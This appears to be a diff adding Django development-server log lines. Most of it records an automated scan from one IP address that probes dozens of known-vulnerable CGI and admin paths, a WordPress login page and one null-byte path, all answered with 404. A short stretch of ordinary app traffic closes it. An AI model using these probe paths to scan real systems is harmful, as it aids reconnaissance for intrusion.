+[08/Oct/2023 04:52:20] "GET /cgi-bin/admin.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/admin.cgi
+[08/Oct/2023 04:52:21] "GET /cgi-bin/admin.cgi HTTP/1.1" 404 5334
+Not Found: /index.jsp x
+[08/Oct/2023 04:52:21] "GET /index.jsp%00x HTTP/1.1" 404 5318
+Not Found: /cgi-bin/admin.pl
+Not Found: /user_settings.cfg
+[08/Oct/2023 04:52:21] "GET /user_settings.cfg HTTP/1.1" 404 5334
+[08/Oct/2023 04:52:21] "GET /cgi-bin/admin.pl HTTP/1.1" 404 5331
+Not Found: /cgi-bin/admin.pl
+[08/Oct/2023 04:52:22] "GET /cgi-bin/admin.pl HTTP/1.1" 404 5331
+[08/Oct/2023 04:52:22,876] - Broken pipe from ('130.253.1.147', 56384)
+
+[08/Oct/2023 04:52:22,895] - Broken pipe from ('130.253.1.147', 56386)
+
+Not Found: /cgi-bin/administrator
+[08/Oct/2023 04:52:23] "GET /cgi-bin/administrator HTTP/1.1" 404 5346
+Not Found: /cgi-bin/administrator
+[08/Oct/2023 04:52:23] "GET /cgi-bin/administrator HTTP/1.1" 404 5346
+Not Found: /cgi-bin/administrator.cgi
+[08/Oct/2023 04:52:24] "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 5358
+Not Found: /cgi-bin/administrator.cgi
+[08/Oct/2023 04:52:24] "GET /cgi-bin/administrator.cgi HTTP/1.1" 404 5358
+Not Found: /cgi-bin/agorn.cgi
+[08/Oct/2023 04:52:24] "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/agorn.cgi
+[08/Oct/2023 04:52:25] "GET /cgi-bin/agorn.cgi HTTP/1.1" 404 5334
+Not Found: /password
+[08/Oct/2023 04:52:25] "GET /password HTTP/1.1" 404 5307
+[08/Oct/2023 04:52:25,400] - Broken pipe from ('130.253.1.147', 57614)
+
+Not Found: /cgi-bin/bugreport.cgi
+[08/Oct/2023 04:52:25] "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 5346
+Not Found: /cgi-bin/bugreport.cgi
+[08/Oct/2023 04:52:26] "GET /cgi-bin/bugreport.cgi HTTP/1.1" 404 5346
+Not Found: /cgi-bin/cart.cgi
+[08/Oct/2023 04:52:26] "GET /cgi-bin/cart.cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/cart.cgi
+[08/Oct/2023 04:52:26] "GET /cgi-bin/cart.cgi HTTP/1.1" 404 5331
+[08/Oct/2023 04:52:26] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-bin/clwarn.cgi
+[08/Oct/2023 04:52:26] "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/clwarn.cgi
+[08/Oct/2023 04:52:27] "GET /cgi-bin/clwarn.cgi HTTP/1.1" 404 5337
+Not Found: /rails_info/properties
+[08/Oct/2023 04:52:27] "GET /rails_info/properties HTTP/1.1" 404 5346
+Not Found: /cgi-bin/count.cgi
+[08/Oct/2023 04:52:27] "GET /cgi-bin/count.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/count.cgi
+[08/Oct/2023 04:52:27] "GET /cgi-bin/count.cgi HTTP/1.1" 404 5334
+[08/Oct/2023 04:52:28,274] - Broken pipe from ('130.253.1.147', 57866)
+
+Not Found: /cgi-bin/Count.cgi
+[08/Oct/2023 04:52:28] "GET /cgi-bin/Count.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/Count.cgi
+[08/Oct/2023 04:52:29] "GET /cgi-bin/Count.cgi HTTP/1.1" 404 5334
+[08/Oct/2023 04:52:29] "GET / HTTP/1.1" 200 35341
+Not Found: /cgi-bin/faqmanager.cgi
+[08/Oct/2023 04:52:29] "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/faqmanager.cgi
+[08/Oct/2023 04:52:29] "GET /cgi-bin/faqmanager.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/FormHandler.cgi
+Not Found: /index.html
+[08/Oct/2023 04:52:30] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 5352
+[08/Oct/2023 04:52:30] "GET /index.html HTTP/1.1" 404 5313
+Not Found: /cgi-bin/FormHandler.cgi
+[08/Oct/2023 04:52:30] "GET /cgi-bin/FormHandler.cgi HTTP/1.1" 404 5352
+[08/Oct/2023 04:52:30,676] - Broken pipe from ('130.253.1.147', 57646)
+
+[08/Oct/2023 04:52:30,997] - Broken pipe from ('130.253.1.147', 58386)
+
+Not Found: /cgi-bin/FormMail.cgi
+[08/Oct/2023 04:52:31] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 5343
+Not Found: /cgi-bin/FormMail.cgi
+[08/Oct/2023 04:52:31] "GET /cgi-bin/FormMail.cgi HTTP/1.1" 404 5343
+Not Found: /cgi-bin/guestbook.cgi
+[08/Oct/2023 04:52:31] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 5346
+Not Found: /cgi-bin/guestbook.cgi
+[08/Oct/2023 04:52:31] "GET /cgi-bin/guestbook.cgi HTTP/1.1" 404 5346
+Not Found: /cgi-bin/help.cgi
+[08/Oct/2023 04:52:32] "GET /cgi-bin/help.cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/help.cgi
+[08/Oct/2023 04:52:32] "GET /cgi-bin/help.cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/hi
+[08/Oct/2023 04:52:33] "GET /cgi-bin/hi HTTP/1.1" 404 5313
+Not Found: /cgi-bin/hi
+[08/Oct/2023 04:52:33] "GET /cgi-bin/hi HTTP/1.1" 404 5313
+Not Found: /cgi-bin/index.cgi
+[08/Oct/2023 04:52:33] "GET /cgi-bin/index.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/index.cgi
+[08/Oct/2023 04:52:34] "GET /cgi-bin/index.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/index.pl
+[08/Oct/2023 04:52:34] "GET /cgi-bin/index.pl HTTP/1.1" 404 5331
+Not Found: /cgi-bin/index.pl
+[08/Oct/2023 04:52:34] "GET /cgi-bin/index.pl HTTP/1.1" 404 5331
+Not Found: /cgi-bin/index.sh
+[08/Oct/2023 04:52:35] "GET /cgi-bin/index.sh HTTP/1.1" 404 5331
+Not Found: /cgi-bin/index.sh
+[08/Oct/2023 04:52:35] "GET /cgi-bin/index.sh HTTP/1.1" 404 5331
+Not Found: /cgi-bin/login
+[08/Oct/2023 04:52:35] "GET /cgi-bin/login HTTP/1.1" 404 5322
+Not Found: /cgi-bin/login.cgi
+[08/Oct/2023 04:52:36] "GET /cgi-bin/login.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/login.cgi
+[08/Oct/2023 04:52:36] "GET /cgi-bin/login.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin/mailit.pl
+[08/Oct/2023 04:52:37] "GET /cgi-bin/mailit.pl HTTP/1.1" 404 5334
+Not Found: /cgi-bin/mailit.pl
+[08/Oct/2023 04:52:37] "GET /cgi-bin/mailit.pl HTTP/1.1" 404 5334
+Not Found: /cgi-bin/mt/mt-check.cgi
+[08/Oct/2023 04:52:38] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 5352
+Not Found: /cgi-bin/mt/mt-check.cgi
+[08/Oct/2023 04:52:38] "GET /cgi-bin/mt/mt-check.cgi HTTP/1.1" 404 5352
+Not Found: /cgi-bin/mt/mt-load.cgi
+[08/Oct/2023 04:52:38] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/mt/mt-load.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/mt/mt-load.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/mt-static/mt-check.cgi
+Not Found: /cgi-bin/mt-static/mt-check.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 5373
+[08/Oct/2023 04:52:39] "GET /cgi-bin/mt-static/mt-check.cgi HTTP/1.1" 404 5373
+Not Found: /cgi-bin/mt-static/mt-load.cgi
+Not Found: /cgi-bin/mt-static/mt-load.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 5370
+[08/Oct/2023 04:52:39] "GET /cgi-bin/mt-static/mt-load.cgi HTTP/1.1" 404 5370
+Not Found: /cgi-bin/ncbook/book.cgi
+Not Found: /cgi-bin/ncbook/book.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 5352
+[08/Oct/2023 04:52:39] "GET /cgi-bin/ncbook/book.cgi HTTP/1.1" 404 5352
+Not Found: /cgi-bin/printenv
+Not Found: /cgi-bin/printenv
+[08/Oct/2023 04:52:39] "GET /cgi-bin/printenv HTTP/1.1" 404 5331
+[08/Oct/2023 04:52:39] "GET /cgi-bin/printenv HTTP/1.1" 404 5331
+Not Found: /cgi-bin/printenv.cgi
+Not Found: /cgi-bin/printenv.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 5343
+[08/Oct/2023 04:52:39] "GET /cgi-bin/printenv.cgi HTTP/1.1" 404 5343
+Not Found: /cgi-bin/quickstore.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/quickstore.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/quickstore.cgi HTTP/1.1" 404 5349
+Not Found: /cgi-bin/search
+[08/Oct/2023 04:52:39] "GET /cgi-bin/search HTTP/1.1" 404 5325
+Not Found: /cgi-bin/search
+[08/Oct/2023 04:52:39] "GET /cgi-bin/search HTTP/1.1" 404 5325
+Not Found: /cgi-bin/search.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/search.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/search.cgi
+[08/Oct/2023 04:52:39] "GET /cgi-bin/search.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/search/search.cgi
+[08/Oct/2023 04:52:40] "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 5358
+Not Found: /cgi-bin/search/search.cgi
+[08/Oct/2023 04:52:40] "GET /cgi-bin/search/search.cgi HTTP/1.1" 404 5358
+Not Found: /cgi-bin/status
+[08/Oct/2023 04:52:40] "GET /cgi-bin/status HTTP/1.1" 404 5325
+Not Found: /cgi-bin/status
+[08/Oct/2023 04:52:40] "GET /cgi-bin/status HTTP/1.1" 404 5325
+Not Found: /cgi-bin/status.cgi
+[08/Oct/2023 04:52:41] "GET /cgi-bin/status.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/status.cgi
+[08/Oct/2023 04:52:41] "GET /cgi-bin/status.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/test.cgi
+[08/Oct/2023 04:52:43] "GET /cgi-bin/test.cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/test.cgi
+[08/Oct/2023 04:52:43] "GET /cgi-bin/test.cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/test.sh
+[08/Oct/2023 04:52:44] "GET /cgi-bin/test.sh HTTP/1.1" 404 5328
+Not Found: /cgi-bin/test.sh
+[08/Oct/2023 04:52:44] "GET /cgi-bin/test.sh HTTP/1.1" 404 5328
+Not Found: /cgi-bin/test-cgi
+[08/Oct/2023 04:52:45] "GET /cgi-bin/test-cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/test-cgi
+[08/Oct/2023 04:52:45] "GET /cgi-bin/test-cgi HTTP/1.1" 404 5331
+Not Found: /cgi-bin/upload.cgi
+Not Found: /cgi-bin/upload.cgi
+[08/Oct/2023 04:52:46] "GET /cgi-bin/upload.cgi HTTP/1.1" 404 5337
+[08/Oct/2023 04:52:46] "GET /cgi-bin/upload.cgi HTTP/1.1" 404 5337
+Not Found: /cgi-bin/urlcount.cgi
+Not Found: /cgi-bin/urlcount.cgi
+[08/Oct/2023 04:52:47] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 5343
+[08/Oct/2023 04:52:47] "GET /cgi-bin/urlcount.cgi HTTP/1.1" 404 5343
+Not Found: /cgi-bin/viewcvs.cgi
+Not Found: /cgi-bin/viewcvs.cgi
+[08/Oct/2023 04:52:48] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 5340
+[08/Oct/2023 04:52:48] "GET /cgi-bin/viewcvs.cgi HTTP/1.1" 404 5340
+Not Found: /cgi-bin/wa
+Not Found: /cgi-bin/wa
+[08/Oct/2023 04:52:49] "GET /cgi-bin/wa HTTP/1.1" 404 5313
+[08/Oct/2023 04:52:49] "GET /cgi-bin/wa HTTP/1.1" 404 5313
+Not Found: /cgi-bin/wa.cgi
+Not Found: /cgi-bin/wa.cgi
+[08/Oct/2023 04:52:50] "GET /cgi-bin/wa.cgi HTTP/1.1" 404 5325
+[08/Oct/2023 04:52:50] "GET /cgi-bin/wa.cgi HTTP/1.1" 404 5325
+Not Found: /cgi-bin/wa.exe
+Not Found: /cgi-bin/wa.exe
+[08/Oct/2023 04:52:51] "GET /cgi-bin/wa.exe HTTP/1.1" 404 5325
+[08/Oct/2023 04:52:51] "GET /cgi-bin/wa.exe HTTP/1.1" 404 5325
+Not Found: /cgi-bin/whois.cgi
+Not Found: /cgi-bin/whois.cgi
+[08/Oct/2023 04:52:52] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 5334
+[08/Oct/2023 04:52:52] "GET /cgi-bin/whois.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-bin-sdb/printenv
+[08/Oct/2023 04:52:53] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 5343
+Not Found: /cgi-bin-sdb/printenv
+[08/Oct/2023 04:52:53] "GET /cgi-bin-sdb/printenv HTTP/1.1" 404 5343
+Not Found: /cgi-mod/index.cgi
+Not Found: /cgi-mod/index.cgi
+[08/Oct/2023 04:52:54] "GET /cgi-mod/index.cgi HTTP/1.1" 404 5334
+[08/Oct/2023 04:52:54] "GET /cgi-mod/index.cgi HTTP/1.1" 404 5334
+Not Found: /cgi-sys/defaultwebpage.cgi
+[08/Oct/2023 04:52:55] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 5361
+Not Found: /cgi-sys/defaultwebpage.cgi
+[08/Oct/2023 04:52:55] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 5361
+Not Found: /cgi-sys/entropysearch.cgi
+Not Found: /cgi-sys/entropysearch.cgi
+[08/Oct/2023 04:52:56] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 5358
+[08/Oct/2023 04:52:56] "GET /cgi-sys/entropysearch.cgi HTTP/1.1" 404 5358
+Not Found: /index.cgi
+Not Found: /index.cgi
+[08/Oct/2023 04:52:57] "GET /index.cgi HTTP/1.1" 404 5310
+[08/Oct/2023 04:52:57] "GET /index.cgi HTTP/1.1" 404 5310
+Not Found: /index.pl
+Not Found: /index.pl
+[08/Oct/2023 04:52:58] "GET /index.pl HTTP/1.1" 404 5307
+[08/Oct/2023 04:52:58] "GET /index.pl HTTP/1.1" 404 5307
+Not Found: /index.sh
+Not Found: /index.sh
+[08/Oct/2023 04:52:59] "GET /index.sh HTTP/1.1" 404 5307
+[08/Oct/2023 04:52:59] "GET /index.sh HTTP/1.1" 404 5307
+Not Found: /nph-mr.cgi
+[08/Oct/2023 04:53:00] "GET /nph-mr.cgi HTTP/1.1" 404 5313
+Not Found: /nph-mr.cgi
+[08/Oct/2023 04:53:00] "GET /nph-mr.cgi HTTP/1.1" 404 5313
+Not Found: /query.cgi
+[08/Oct/2023 04:53:01] "GET /query.cgi HTTP/1.1" 404 5310
+Not Found: /query.cgi
+[08/Oct/2023 04:53:01] "GET /query.cgi HTTP/1.1" 404 5310
+Not Found: /session_login.cgi
+[08/Oct/2023 04:53:01] "GET /session_login.cgi HTTP/1.1" 404 5334
+Not Found: /session_login.cgi
+[08/Oct/2023 04:53:01] "GET /session_login.cgi HTTP/1.1" 404 5334
+Not Found: /show_bug.cgi
+[08/Oct/2023 04:53:02] "GET /show_bug.cgi HTTP/1.1" 404 5319
+Not Found: /show_bug.cgi
+[08/Oct/2023 04:53:02] "GET /show_bug.cgi HTTP/1.1" 404 5319
+Not Found: /test
+[08/Oct/2023 04:53:04] "GET /test HTTP/1.1" 404 5295
+Not Found: /test
+[08/Oct/2023 04:53:04] "GET /test HTTP/1.1" 404 5295
+Not Found: /test.cgi
+[08/Oct/2023 04:53:05] "GET /test.cgi HTTP/1.1" 404 5307
+Not Found: /test.cgi
+[08/Oct/2023 04:53:05] "GET /test.cgi HTTP/1.1" 404 5307
+Not Found: /ucsm/isSamInstalled.cgi
+[08/Oct/2023 04:53:06] "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 5352
+Not Found: /ucsm/isSamInstalled.cgi
+[08/Oct/2023 04:53:06] "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 5352
+Not Found: /whois.cgi
+[08/Oct/2023 04:53:07] "GET /whois.cgi HTTP/1.1" 404 5310
+Not Found: /whois.cgi
+[08/Oct/2023 04:53:08] "GET /whois.cgi HTTP/1.1" 404 5310
+Not Found: /wp-login.php
+[08/Oct/2023 04:53:09] "GET /wp-login.php HTTP/1.1" 404 5319
+Not Found: /wp-login.php
+[08/Oct/2023 04:53:09] "GET /wp-login.php HTTP/1.1" 404 5319
+Not Found: /wwwadmin.cgi
+[08/Oct/2023 04:53:10] "GET /wwwadmin.cgi HTTP/1.1" 404 5319
+Not Found: /wwwadmin.cgi
+[08/Oct/2023 04:53:10] "GET /wwwadmin.cgi HTTP/1.1" 404 5319
+Not Found: /wwwboard.cgi
+[08/Oct/2023 04:53:11] "GET /wwwboard.cgi HTTP/1.1" 404 5319
+Not Found: /wwwboard.cgi
+[08/Oct/2023 04:53:11] "GET /wwwboard.cgi HTTP/1.1" 404 5319
+Not Found: /xampp/cgi.cgi
+[08/Oct/2023 04:53:12] "GET /xampp/cgi.cgi HTTP/1.1" 404 5322
+Not Found: /xampp/cgi.cgi
+[08/Oct/2023 04:53:12] "GET /xampp/cgi.cgi HTTP/1.1" 404 5322
+[08/Oct/2023 04:53:13,343] - Broken pipe from ('130.253.1.147', 54764)
+
+[08/Oct/2023 04:53:13,590] - Broken pipe from ('130.253.1.147', 54816)
+
+[09/Oct/2023 17:16:57] "GET / HTTP/1.1" 200 35341
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/bootstrap-icons/bootstrap-icons.css HTTP/1.1" 304 0
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/boxicons/css/boxicons.min.css HTTP/1.1" 304 0
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/quill/quill.snow.css HTTP/1.1" 304 0
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/quill/quill.bubble.css HTTP/1.1" 304 0
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/remixicon/remixicon.css HTTP/1.1" 304 0
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/simple-datatables/style.css HTTP/1.1" 304 0
+[09/Oct/2023 17:16:57] "GET /static/assets/css/style.css HTTP/1.1" 304 0
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js HTTP/1.1" 200 80668
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/chart.js/chart.umd.js HTTP/1.1" 200 204922
+[09/Oct/2023 17:16:57] "GET /static/assets/img/baic.png HTTP/1.1" 200 1190651
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/apexcharts/apexcharts.min.js HTTP/1.1" 200 512609
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/quill/quill.min.js HTTP/1.1" 200 216333
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/simple-datatables/simple-datatables.js HTTP/1.1" 200 91304
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/php-email-form/validate.js HTTP/1.1" 200 2734
+[09/Oct/2023 17:16:57] "GET /static/assets/js/main.js HTTP/1.1" 200 9338
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/tinymce/tinymce.min.js HTTP/1.1" 200 424649
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/echarts/echarts.min.js HTTP/1.1" 200 1024740
+[09/Oct/2023 17:16:57] "GET /static/assets/vendor/bootstrap-icons/fonts/bootstrap-icons.woff2?1fa40e8900654d2863d011707b9fb6f2 HTTP/1.1" 200 121340
+[09/Oct/2023 17:17:07] "GET /subjectNew HTTP/1.1" 301 0
+[09/Oct/2023 17:17:07] "GET /subjectNew/ HTTP/1.1" 200 14783
+[09/Oct/2023 17:17:16] "GET /interviewUpdate/5154_5109_5126 HTTP/1.1" 302 0
+[09/Oct/2023 17:17:17] "GET /interviewNew/5154_5109_5126 HTTP/1.1" 200 40829
+[09/Oct/2023 17:17:34] "GET /subjectNew/ HTTP/1.1" 200 14783
+[09/Oct/2023 17:17:41] "POST /subjectNew/ HTTP/1.1" 302 0
+[09/Oct/2023 17:17:41] "GET /home HTTP/1.1" 301 0
+[09/Oct/2023 17:17:41] "GET /home/ HTTP/1.1" 200 36472
+[09/Oct/2023 17:17:52] "GET /subjectUpdate/9999 HTTP/1.1" 200 14747
+[09/Oct/2023 17:17:57] "GET /interviewUpdate/9999_5126 HTTP/1.1" 302 0
+[09/Oct/2023 17:17:57] "GET /interviewNew/9999_5126 HTTP/1.1" 200 40824
